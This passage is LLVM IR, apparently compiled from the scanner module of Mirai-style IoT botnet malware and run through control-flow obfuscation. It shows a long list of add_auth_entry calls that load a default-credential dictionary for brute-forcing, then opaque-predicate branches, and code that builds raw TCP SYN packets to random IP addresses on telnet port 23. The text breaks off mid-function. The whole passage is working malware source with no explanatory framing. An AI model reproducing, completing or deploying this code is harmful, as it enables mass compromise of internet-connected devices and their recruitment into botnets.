  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.34, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.41, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.42, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.78, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.92, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.97, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.99, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i16 zeroext 1)
  br label %230

; <label>:230:                                    ; preds = %2144, %184
  %231 = load i32, i32* @x.7
  %232 = load i32, i32* @y.8
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %230
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %239 = load i32, i32* @fake_time, align 4
  %240 = load i32, i32* %13, align 4
  %241 = icmp ne i32 %239, %240
  %242 = load i32, i32* @x.7
  %243 = load i32, i32* @y.8
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %241, label %250, label %378

; <label>:250:                                    ; preds = %originalBBpart223
  %251 = load i32, i32* @x.7
  %252 = load i32, i32* @y.8
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %250
  %259 = load i32, i32* @fake_time, align 4
  store i32 %259, i32* %13, align 4
  store i32 0, i32* %1, align 4
  %260 = load i32, i32* @x.7
  %261 = load i32, i32* @y.8
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %268

; <label>:268:                                    ; preds = %358, %originalBBpart227
  %269 = load i32, i32* @x.7
  %270 = load i32, i32* @y.8
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %268
  %277 = load i32, i32* %1, align 4
  %278 = icmp slt i32 %277, 760
  %279 = load i32, i32* @x.7
  %280 = load i32, i32* @y.8
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %278, label %287, label %361

; <label>:287:                                    ; preds = %originalBBpart231
  %288 = load i32, i32* @x.7
  %289 = load i32, i32* @y.8
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %287
  %296 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %296, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %18, align 8
  %297 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i64 1
  %299 = bitcast %struct.iphdr* %298 to %struct.tcphdr*
  store %struct.tcphdr* %299, %struct.tcphdr** %19, align 8
  %300 = call i32 @rand_next()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 3
  store i16 %301, i16* %303, align 4
  %304 = load i32, i32* @LOCAL_ADDR, align 4
  %305 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 8
  store i32 %304, i32* %306, align 4
  %307 = call i32 @get_random_ip()
  %308 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 9
  store i32 %307, i32* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 7
  store i16 0, i16* %311, align 2
  %312 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %313 = bitcast %struct.iphdr* %312 to i16*
  %314 = call zeroext i16 @checksum_generic(i16* %313, i32 20)
  %315 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %316 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %315, i32 0, i32 7
  store i16 %314, i16* %316, align 2
  %317 = call zeroext i16 @htons(i16 zeroext 23) #9
  %318 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 1
  store i16 %317, i16* %319, align 2
  %320 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  %322 = load i32, i32* %321, align 4
  %323 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 2
  store i32 %322, i32* %324, align 4
  %325 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 6
  store i16 0, i16* %326, align 4
  %327 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %328 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %329 = bitcast %struct.tcphdr* %328 to i8*
